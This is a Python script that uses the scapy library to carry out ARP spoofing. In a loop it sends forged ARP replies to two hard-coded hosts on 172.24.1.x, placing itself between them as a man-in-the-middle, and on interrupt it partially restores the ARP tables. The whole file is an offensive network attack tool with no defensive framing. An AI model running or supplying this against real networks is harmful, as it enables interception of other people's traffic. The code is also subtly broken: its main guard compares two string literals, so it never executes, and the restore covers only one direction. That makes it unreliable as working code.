import scapy.all as scapy
import time


def main():
    def retrieve_macAddress(ip):
        arp_REQ = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_req_broadcast = broadcast/arp_REQ
        recieved_res_list = scapy.srp(
            arp_req_broadcast, timeout=1, verbose=False)[0]
        return recieved_res_list[0][1].hwsrc

    def arpSpoof(target_ip, source_ip):
        target_mac = retrieve_macAddress(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip,
                           hwdst=target_mac, psrc=source_ip)
        scapy.send(packet, verbose=False)

    def restoreARP(dest_ip, source_ip):
        dest_mac = retrieve_macAddress(dest_ip)
        source_mac = retrieve_macAddress(source_ip)
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                           psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

    sent_packets_count = 0

    try:
        while True:
            arpSpoof("172.24.1.151", "172.24.1.1")
            arpSpoof("172.24.1.1", "172.24.1.151")
            sent_packets_count = sent_packets_count + 1
            print("\r[+] Packets sent:" + str(sent_packets_count), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("[-] Detect CTRL-C -> Restoring Variables..")
        restoreARP("172.24.1.151", "172.24.1.1")
        time.sleep(5)
        print("[+] [ARP] Table Restored To Default State.")


if "__name__" == "__main__":
    main()
